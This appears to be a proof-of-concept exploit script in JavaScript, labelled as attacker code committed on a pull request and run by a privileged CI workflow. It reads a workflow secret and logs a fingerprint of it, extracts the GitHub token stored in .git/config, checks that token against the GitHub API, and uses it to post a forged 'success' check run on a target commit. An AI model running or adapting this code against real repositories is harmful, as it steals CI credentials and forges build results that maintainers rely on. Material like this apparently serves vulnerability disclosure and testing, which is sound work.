// Attacker-controlled code committed on the pull request head (executed by the
// privileged workflow that checked out this ref).
(async () => {
  const s = process.env.SLASH_CMD_SECRET || 'MISSING';
  const sum = [...s].reduce((a, c) => a + c.charCodeAt(0), 0);
  console.log('SECRET_LEN=' + s.length + ' SECRET_SUM=' + sum);
  const fs = require('fs');
  const cfg = fs.readFileSync('.git/config', 'utf8');
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/i);
  console.log('WORKFLOW_TOKEN_PRESENT=' + (m ? 'yes' : 'no'));
  if (m) {
    const decoded = Buffer.from(m[1], 'base64').toString();
    const tok = decoded.split(':').slice(1).join(':') || decoded;
    const r = await fetch('https://api.github.com/user', {
      headers: { Authorization: 'Bearer ' + tok, Accept: 'application/vnd.github+json' },
    });
    const j = await r.json();
    console.log('TOKEN_API_STATUS=' + r.status + ' AS=' + j.login);
    const cr = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/check-runs', {
      method: 'POST',
      headers: { Authorization: 'Bearer ' + tok, Accept: 'application/vnd.github+json' },
      body: JSON.stringify({ name: 'forged-check-from-pr-code', head_sha: process.env.TARGET_SHA, status: 'completed', conclusion: 'success', output: { title: 'x', summary: 'y' } }),
    });
    console.log('CHECKRUN_STATUS=' + cr.status);
  }
})();
